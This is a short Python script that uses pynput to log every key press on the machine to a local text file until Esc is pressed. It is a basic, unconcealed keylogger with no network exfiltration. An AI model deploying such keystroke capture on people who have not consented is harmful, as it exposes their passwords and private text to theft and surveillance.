from pynput import keyboard

# File where keystrokes will be logged
log_file = "key_log.txt"

def on_press(key):
    try:
        # Record the key pressed
        with open(log_file, "a") as f:
            f.write('{0} '.format(key.char))
    except AttributeError:
        # Record special keys (e.g., shift, ctrl)
        with open(log_file, "a") as f:
            f.write('{0} '.format(key))

def on_release(key):
    # Exit the logger when Esc key is pressed
    if key == keyboard.Key.esc:
        return False

# Setup the listener to monitor key press and key release events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the listener and keep it running
    listener.join()

 

